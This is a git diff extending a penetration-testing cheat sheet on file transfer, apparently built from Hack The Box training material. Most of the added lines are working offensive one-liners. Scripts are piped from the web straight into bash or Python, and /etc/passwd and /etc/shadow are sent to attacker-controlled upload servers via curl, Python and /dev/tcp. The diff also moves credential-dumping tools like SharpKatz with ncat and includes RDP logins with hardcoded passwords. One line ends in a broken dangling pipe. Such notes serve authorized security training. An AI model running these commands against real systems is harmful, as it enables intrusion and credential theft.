@@ -61,6 +61,12 @@ wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
+Fileless Attacks:
+```bash
+#  Fileless Attacks (excut without download the file)
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | 
+wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+```
 
 **Windows**
 
@@ -129,8 +135,31 @@ curl -X POST http://HOST/upload -F 'files=@file.txt'
 Invoke-FileUpload -Uri http://HOST/upload -File <path>  # powershell
 ```
 
-### **HTTPS Server**
+**Alternative Web File Transfer Method**
+if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, . A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server
+```bash
+# on victime
+python3 -m http.server
+python2.7 -m SimpleHTTPServer
+php -S 0.0.0.0:8000
+ruby -run -ehttpd . -p8000 
 
+# download the file from web server
+wget 192.168.49.128:8000/filetotransfer.txt
+```
+>**Note:** When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.
+### **HTTPS Server**
+```bash
+# on the attacker 
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server' # Pwnbox - Create a Self-Signed Certificate
+mkdir https && cd https
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+
+# on victime
+curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure # --insecure because we used a self-signed certificate that we trust
+```
+
+others methods:
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -294,13 +323,19 @@ copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\ # upload
 ```
 ## SCP
 
-The attacker has to have SSHd running.
+The attacker has to have SSHd running. if no setup a ssh server
 
 ```bash
+# setup ssh server on attacker machine first 
+sudo systemctl enable ssh
+sudo systemctl start ssh
+netstat -lnpt             # check the ssh port 22 open 
 scp <directory>/<filename> <username>@<Attacker_IP>:"<to_folder/tmp/>"
-#example
-scp ./PowerView.ps1 Administrator@10.10.196.248:"C:\\"
+
+# download 
+scp <username>@<Attacker_IP>:"<to_folder/file>" .
 ```
+>**Note:** You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.
 
 ## SSHFS
 
@@ -316,8 +351,18 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 
 ```bash
 nc -lvnp 4444 > new_file
-nc -vn <IP> 4444 < exfil_file
+nc -vn <IP> 4444 < exfil_file # we can add -q 0 will close the connection once the file upload finishes
 ```
+## Ncat
+```bash
+ncat --send-only 192.168.49.128 8000 < SharpKatz.exe # --send-only for  immediately close the connection once it done.
+ncat -l -p 8000 --recv-only > SharpKatz.exe # --recv-only to close the connection once the file transfer is finished
+```
+> Connecting to Netcat or Ncat Using /dev/tcp
+> ```bash
+cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+cat /etc/passwd > /dev/tcp/192.168.49.128/443
+
 
 ## /dev/tcp
 
@@ -458,6 +503,122 @@ Then copy-paste the text into the windows-shell and a file called nc.exe will be
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
+
+## Python
+###  Python  - Download
+```bash
+python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")' # python 2
+
+python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")' # ptyhon 3
+```
+###  Python  - Upload
+```bash
+python3 -m uploadserver # on attacker
+#### Uploading a File Using a Python One-liner
+python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+```
+## PHP
+### PHP Download 
+```bash
+# with File_get_contents()
+php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+
+#  with Fopen()
+php -r 'const BUFFER = 1024; $fremote = 
+fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+
+#  Download a File and Pipe it to Bash (similar to the fileless)
+php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+  # Note: The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.
+```
+
+## Ruby
+### Ruby - Download a File
+```bash
+ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+```
+## Perl
+###  Perl - Download a File 
+```bash
+perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+```
+## JavaScript
+The following JavaScript code is based on [this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) post, and we can download a file using it. We'll create a file called `wget.js` and save the following content:
+```javascript
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(1));
+```
+We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.
+```bash
+cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
+```
+## VBScript
+### VBScript - download a file
+The following VBScript example can be used based on [this](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs). We'll create a file called `wget.vbs` and save the following content:
+```vbscript
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", WScript.Arguments.Item(0), False
+xHttp.Send
+
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(1), 2
+end with
+```
+We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.
+```bash
+C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+```
+
+
+## PowerShell Session File Transfer
+there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2)
+[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.
+
+To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration.
+```bash
+# transfer a file from `DC01` to `DATABASE01`
+
+whoami #=> htb\administrator
+hostname #=> DC01
+Test-NetConnection -ComputerName DATABASE01 -Port 5985 #=> # Confirm WinRM port TCP 5985 is Open on DATABASE01
+$Session = New-PSSession -ComputerName DATABASE01 # Because this session already has privileges over DATABASE01, we don't need to specify credentials
+
+Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\ # Copy  from our Localhost to the DATABASE01 Session
+
+Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session # Copy from DATABASE01 Session to our Localhost
+```
+## RDP
+RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.
+
+If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.
+
+As an alternative to copy and paste, we can mount a local resource on the target RDP server.
+```bash
+# Mounting a Linux Folder Using rdesktop
+rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+
+# Mounting a Linux Folder Using xfreerdp
+xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+
+# To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.
+```
+![](https://academy.hackthebox.com/storage/modules/24/tsclient.jpg)
+
+** on windows**:
+Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.
+![](https://academy.hackthebox.com/storage/modules/24/rdp.png)
+After selecting the drive, we can interact with it in the remote session that follows.
+>**Note:** This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.
 
 **Try Hard Security Group**
 
